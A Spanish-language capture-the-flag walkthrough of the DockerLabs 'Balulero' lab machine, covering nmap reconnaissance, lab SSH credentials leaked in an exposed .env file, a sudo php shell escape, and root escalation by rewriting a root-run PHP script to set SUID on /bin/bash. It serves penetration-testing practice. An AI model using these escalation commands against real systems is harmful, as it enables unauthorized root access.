# BALULERO - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Balulero. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./balulero.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: fácil
- Sistema Operativo: linux
- Autor: El Pingüino de Mario

## ESQUEMA

![balulero](https://github.com/user-attachments/assets/4fa0321a-4df7-48cd-9f0c-fea9848c469a)

## RECONOCIMIENTO DE RED

### conectividad y SO

Primero comprobamos la conectividad con la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/67f5c042-7e8b-4101-9d38-254fc4196c9b)

Nos llega respuesta con TTL 64, así que el sistema operativo será Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/c652206a-34c4-4d42-8ed7-88ead7f5466c)

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

Ahora sobre estos dos puertos hacemos otro escaneo de versiones y servicios con nmap:

```python
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

> `-p22,80` hacer el escaneo solo sobre estos dos puertos

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/a11a81f9-859d-4c58-904a-d2594f01f00d)

## RECONOCIMIENTO WEB

![image](https://github.com/user-attachments/assets/518eff4f-baa4-463d-9584-32155a4c5e3c)

Dentro de la web a simple vista no hay nada interesante. Al inspeccionar el código HTML al final se puede ver un archivo javascript:

![image](https://github.com/user-attachments/assets/5f24701b-2980-4cb5-9602-56b90546a664)

Dentro de este archivo, en el código hay una línea que nos da información:

![image](https://github.com/user-attachments/assets/f738d7cf-cd50-4bd4-a7ed-097967f39cfc)

## INTRUSIÓN

Si probamos a cargar el archivo .env_de_baluchingon vemos unas credenciales:

![image](https://github.com/user-attachments/assets/9cd6c7cf-83b0-4d73-9a32-9bd85b09a304)

Ahora para conectarnos ejecutamos `ssh balu@172.17.0.2` y de contraseña "balubalulerobalulei".

## ESCALADA DE PRIVILEGIOS

### chocolate

Siendo el usuario balu, si ejecutamos `sudo -l` vemos que tenemos estos privilegios:

![image](https://github.com/user-attachments/assets/7dc6b9c1-184c-413f-aa46-5fc8d657148d)

Podemos ejecutar como el usuario chocolate el binario `/usr/bin/php`. Así que para ejecutar una bash como este usuario hacemos:

```python
sudo -u chocolate php -r 'system("bash");'
```

![image](https://github.com/user-attachments/assets/6f79ff47-a824-4a17-9c84-fca988c83d27)

### root

Siendo el usuario chocolate, no encontramos forma de escalar, ni buscando archivos SUID, abusando de sudo, o de grupos. Podemos probar a descargar [pspy](https://github.com/DominicBreuker/pspy) para ver que procesos y comandos se están ejecutando. Una vez descargado le damos permisos de ejecución (`chmod +x ./pspy64`) y lo ejecutamos:

![image](https://github.com/user-attachments/assets/e6a44058-ff25-4cb0-9106-356142ae7170)

Vemos que en un momento se ejecuta `php /opt/script.php` por el usuario con UID 0 (root). Si hacemos `ls -l /opt/script.php` vemos que chocolate es el propietario del archivo y tiene permisos de escritura:

![image](https://github.com/user-attachments/assets/761cb46a-cc94-4010-ad4b-f9fd361009ca)

Así que cambiamos el contenido del archivo para que cada vez que se ejecute se intente darle privilegios SUID a la bash:

```python
echo -e "<?php\n\tsystem('chmod u+s /bin/bash');\n?>" > /opt/script.php
```

Y si esperamos unos segundos y hacemos `ls -l /bin/bash`:

![image](https://github.com/user-attachments/assets/a2e5eaef-3d0d-4a3a-92c6-bc612463b811)

Ahora tiene permisos SUID, por lo que hacemos `bash -p` para ganar una bash como root:

![image](https://github.com/user-attachments/assets/ed38fdd5-5a85-4522-914d-a38680356c55)